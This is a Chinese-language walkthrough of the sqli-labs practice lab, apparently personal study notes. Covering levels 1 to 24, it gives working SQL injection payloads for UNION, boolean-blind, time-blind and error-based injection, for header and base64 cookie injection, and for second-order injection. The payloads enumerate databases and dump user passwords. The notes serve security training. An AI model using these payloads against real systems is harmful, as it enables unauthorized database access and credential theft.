前提提示
1，获取什么类型注入
2，尝试闭合语句
第一关
判断注入
参数后面输入1'判断是否有sql注入
发现有明细sql语句报错，通过报错内容得出该数据库为mysql，并且还是显注类型。
尝试闭合
id=1 and 1=1 --+ 显示正确页面
and 1=2 --+ 因为后面加了个必假条件 所以为得到正确页面
尝试注入
order by 4判断当前表是否有4个字段，发现没有四个字段，往下延伸。只有三个字段，利用联合查询，看字段出现在页面那个位置。
在联合查询时，需要干掉前面的闭合语句，并且列数必须要与前面判断出来的一致。
利用mysql源数据库信息，注入当前有那些库名
但是通过当前页面只能看到一个原始库，大概率是在代码处加上了limit 01只取一行，所以需要利用
group_concat 来让他显示所有库
成功得到当前服务器所有库名第二关
在参数后面加\，看页面是否会返回报错信息，得到报错 near '\ LIMIT 0,1' at line 1，看这报错信息当前
语句并没有给id加上引号这些内容，可以直接在后面加注入语句。
select database()直接判断当前库。
第三关
通过报错信息，判断当前闭合 是（''）形式尝试闭合
id =1') and 1=1 --+
尝试注入出当前库有那些表
第四关
判断是否有注入
通过报错信息得出 当前闭合形式为 ("id")
尝试闭合
id=1")尝试注入当前表有那些字段
第五关
判断注入
通过报错信息 得出当前闭合为 单引号闭合
但是当前页面并没有显示任何内容，通过 and 1=1 和 1=2 判断出当前注入为布尔盲注
1=2 页面1=1 页面
尝试注入
布尔盲注 和显注的联合查询不太一样,需要更改一下注入语句
判断当前库名是否大于4
id=1 ' and (length(database())>4--+
最后得出当前库名长度为8个字符
第六关
判断注入
通过报错信息得出当前数据库 闭合为双引号的形式闭合通过 1=1 和1=2 判断出当前注入为布尔盲注
尝试注入
尝试判断服务器第一个库长度多少
?
id=1%22%20and%20%20(select%20length(schema_name)%20from%20information_schema.sche
mata%20limit%200,1)=18%20--+
第七关
判断注入
通过 1' 报错
可以得出 页面就只出现两种页面 大概率是布尔盲注，
尝试闭合
但是报错信息得不到报错的详细信息，只能通过多次尝试，来进行语句的闭合
1" and 1=1 --+
1' and 1=1 --+
1') and 1=1 --+
1')) and 1=11")) and 1=1 --+
最后得出该注入的闭合 为((''))
尝试注入
判断当前数据库长度
1')) and length(database())>4 --+
得出当前数据库长度等于8
第八关
判断注入
通过 1' 页面异常
可以得出 页面就只出现两种页面 大概率是布尔盲注，尝试闭合
但是报错信息得不到报错的详细信息，只能通过多次尝试，来进行语句的闭合
1“" and 1=1 --+
1' and 1=1 --+
1') and 1=1 --+
1')) and 1=1
1")) and 1=1 --+
最后得到 闭合形式为 单引号闭合
尝试注入
判断当前服务器第一个数据库的长度
id=1' and (select length(schema_name) from information_schema.schemata limit 0,1) >4 --+
第九关
判断注入
通过常规注入并没有发现报错，以及页面显示错误
只能尝试尝试seelp 注入了
尝试闭合
因为没有报错信息，所以无法得知闭合信息，只能爆破
?id=1" and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+
?id=1' and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+
?id=1') and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+
?id=1") and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+
?id=1')) and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+?id=1")) and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+
通过页面时间来判断是否成功
尝试注入
判断第一行数据库长度是否大于1
?id=1' and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+
第十关
同理爆破尝试，发现是双引号闭合的时间盲注。
?id=1" and if(length((select schema_name from information_schema.schemata limit
0,1))>1,sleep(3),1)--+第十一关
判断注入
输入框中 1\判断是否有注入
尝试闭合
前端页面注入，没有效果，直接通过burp重放成功。闭合形式为 单引号
1' --+
-admin' union select 1,2 --+
注入当前库名第十二关
判断注入
尝试闭合
通过页面报错判断，闭合形式为("")
闭合形式为 ("")尝试注入
注入当前服务器第二个数据库名
uname=-dumb") union select 1, schema_name from information_schema.schemata limit 1,1 --+
&passwd=dumb&submit=Submit
第十三关
判断注入
有sql语句报错尝试闭合
通过报错信息得知 当前闭合形式为('')
通过 and 1=1 and 1=2 当前注入为post形式的盲注
尝试注入
判断当前数据库长度=8判断当前数据库名字
询问当前数据库第一个字符是否等于s
uname=dumb') and (substring(database(),1,1))="s"--+&passwd=dumb&submit=Submit
利用burp爆破出当前数据库名字为secuity
第十四关
判断注入
有sql语句报错
且闭合形式为双引号闭合
尝试注入利用burp爆出当前数据库的 所有表名
and (substring((select table_name from information_schema.tables where
schema_name="security" limit 0,1),1,1))="s"
第一张表 emails
第二张表
referers
第十五关
判断注入
因为没有报错信息，所以无法闭合，只能爆破
但是界面显示有那种情况，所以可以使用布尔盲注尝试注入
爆出当前数据库用户
当前数据库用户
第十六关
判断注入
通过页面出现情况，结果为真 显示登录成功，结果为假，登录失败
尝试闭合
爆破下面结果
1"and 1=1 --+
1' and 1=1 --+
1') and 1=1 --+1')) and 1=1
1")) and 1=1 --+
最后得到闭合形式 为")
尝试注入
注入当前服务器数据库第二个数据库名字
uname=dumb")and (substr((select schema_name from information_schema.schemata limit
1,1),1,1))='g'--+&passwd=dumb&submit=Submit
bwapp
第十七关
判断注入
在前面都是针对 username这个参数名进行注入的，但是在这关 发现不管怎么测试 发现在此没有注入点
但是在password这个字段报sql语法错误，那注入点大概就是这个位置了。尝试闭合
通过报错，并不能直接看出是什么闭合形式，只能爆破
dumb ' and 1=1 --+
dumb '' and 1=1 --+
dumb ') and 1=1 --+
最后通过测试发现闭合形式 是单引号
但是测试发现布尔盲注也不行只能尝试尝试报错注入了
尝试注入
注入版本信息
uname=admin&passwd=admin' and (select extractvalue(1,concat(0x7e,@@version)))--
+&submit=Submit
注入当前服务器有多少个数据库
uname=admin&passwd=admin' and (select updatexml(1,concat(0x7e,(select
group_concat(schema_name)from information_schema.schemata )),0x7e))--+&submit=Submit注入当前数据库 users中的列
uname=admin&passwd=admin' and (select updatexml(1,concat(0x7e,(select
group_concat(column_name)from information_schema.columns where table_name="users" and
table_schema="security")),0x7e))--+&submit=Submit
第十八关
判断注入
通过页面。常规测试并没有发现注入点，但是页面出现这个，怀疑这个字段是否带入数据库了。抓包分析
但是没有发现xff字段
登录成功后会发现ua字段抓包分析
在ua后加入\出现语法错误
尝试闭合
同上发现不是显注，盲注也不行，爆破闭合形式
id=1 and 1=1 #
id=1' and 1=1 --+
id=1" and 1=1 #
id=1') and 1=1 #
id =1" 没有报语法错误，所以猜测 闭合形式为单引号尝试注入
' and updatexml(1,concat(0x7e,(select user())),0x7e),1)#
第十九关
判断注入
登录成功页面显示 一个referer，猜测在这个字段有注入，抓包分析
果然 在referer字段后面加、报sql语法错误了。
尝试闭合
同十八关一样,单引号闭合
尝试注入
注入当前数据库第二十关
判断注入
登录页面并没有发现注入，但是页面出现了一些字符串，其中包括cookie，怀疑是cookie这个位置存在
注入。
抓包分析
发现在cookie这个点存在注入。
尝试闭合
通过报错信息得知，此处闭合形式为单引号尝试注入
通过 order by 以及联合查询 判断此处存在显注
注入当前库名，用户，以及数据库版本
第二十一关
判断注入
发现这关和前面二十关及其类似，可能只是闭合形式，以及注入类型不同。
发现此处进行了编码设置通过解码发现，做了编码，base64编码。
尝试闭合
通过测试，发现语句闭合形式为 ('')最终注释为 ('') #
尝试注入
Cookie: uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMiwzIw==;
PHPSESSID=3rfnkp4hmelcok62annp3rvf16; security=low
利用联合查询，查看结果在哪里显示注入当前库有那些表
Cookie:
uname=LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvb
SBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0ic2VjdXJpdHkiIw==;
PHPSESSID=3rfnkp4hmelcok62annp3rvf16; security=low
第二十二关
判断注入
发现和前两关类型相似，估计又是在cookie做文章
抓包分析
根据报错信息得出此次闭合形式为双引号尝试闭合
闭合形式为双引号尝试注入
注入当前表里的所有用户密码
Cookie:
uname=LWFkbWluICJ1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQodXNlcm5hbWUpLGdyb3VwX2N
vbmNhdChwYXNzd29yZCkgZnJvbSBzZWN1cml0eS51c2VycyAj;
PHPSESSID=3rfnkp4hmelcok62annp3rvf16; security=low
第二十三关
判断注入
通过在参数输入\ ，出现了报错信息，所以此处存在sql注入
尝试闭合
利用常规注释后面字段，发现不行，通过爆破发现注释符只有 ;%00能用id =1' and 1=1 --+
id =1' and 1=1 ;%00
id =1' and 1=1 #
id =1' and 1=1`
order by 判断列数,发现有三列
尝试注入
判断此处注入为sql显注，并且查询后的结果出现在下图位置。
当前库中的所有表
?
id=-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema
.tables%20where%20table_schema%20="security";%00
第二种表的所有字段第二张表中的所有信息
?
id=-1%27%20union%20select%20group_concat(id),group_concat(referer),group_concat(ip_addres
s)%20from%20security.referers;%00
第二十四关
二阶注入，可以概括为以下两步:
• 第一步：插入恶意数据
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数
据。
• 第二步：引用恶意数据
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进
一步的检验的处理。
这个例子出自sqli-lab的24关。
首先注册一个 admin'# 的用户。然后更改 admin'# 的用户的密码。
而实际上，此次更改的是用户 admin 的密码。
